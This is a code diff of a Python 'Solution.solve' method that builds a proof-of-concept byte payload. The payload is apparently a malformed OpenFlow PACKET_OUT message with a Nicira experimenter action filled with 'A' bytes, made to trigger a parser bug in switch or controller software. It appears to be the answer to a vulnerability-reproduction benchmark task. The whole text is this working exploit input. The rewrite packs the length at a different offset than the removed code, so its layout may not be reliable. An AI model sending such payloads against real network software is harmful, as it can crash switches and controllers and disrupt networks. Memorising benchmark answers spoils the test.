@@ -1,19 +1,27 @@
+import struct
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        header = b'\x01\x0d\x00\x48\x00\x00\x00\x00'
-        buffer_id = b'\x00\x00\x00\x00'
-        in_port = b'\x00\x00'
-        actions_len = b'\x00\x30'
-        pad = b'\x00\x00\x00\x00\x00\x00'
-        ofp_type = b'\xff\xff'
-        ofp_len = b'\x00\x30'
-        experimenter = b'\x00\x00\x23\x20'
-        nx_type = b'\x00\x01'
-        nx_len = b'\x00\x28'
-        prop_type = b'\x00\x01'
-        prop_len = b'\x00\x24'
-        prop_data = b'A' * 32
-        action = ofp_type + ofp_len + experimenter + nx_type + nx_len + prop_type + prop_len + prop_data
-        message_pad = b'\x00\x00'
-        poc = header + buffer_id + in_port + actions_len + pad + action + message_pad
-        return poc
+        poc = bytearray(72)
+        poc[0] = 0x01
+        poc[1] = 0x0D
+        struct.pack_into('>H', poc, 4, 72)
+        struct.pack_into('>I', poc, 8, 0xFFFFFFFF)
+        struct.pack_into('>H', poc, 12, 0)
+        struct.pack_into('>H', poc, 14, 48)
+        offset = 24
+        struct.pack_into('>H', poc, offset, 0xFFFF)
+        offset += 2
+        struct.pack_into('>H', poc, offset, 48)
+        offset += 2
+        struct.pack_into('>I', poc, offset, 0x00002320)
+        offset += 4
+        struct.pack_into('>I', poc, offset, 0x0000001F)
+        offset += 4
+        struct.pack_into('>H', poc, offset, 0x0001)
+        offset += 2
+        struct.pack_into('>H', poc, offset, 36)
+        offset += 2
+        for i in range(32):
+            poc[offset + i] = 0x41
+        return bytes(poc)
